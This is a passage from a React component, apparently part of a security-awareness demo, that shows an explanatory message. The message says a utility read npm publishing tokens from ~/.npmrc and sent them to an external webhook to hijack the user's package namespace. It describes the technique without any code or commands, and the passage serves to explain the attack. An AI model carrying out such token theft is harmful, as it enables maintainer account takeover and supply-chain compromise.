          <p style={{ fontSize: '0.85rem', color: '#cbd5e1', margin: 0 }}>The utility read your publishing tokens from `~/.npmrc` and uploaded them to an external webhook to hijack your package namespace.</p>
        </div>
      )}
    </div>
  );
}
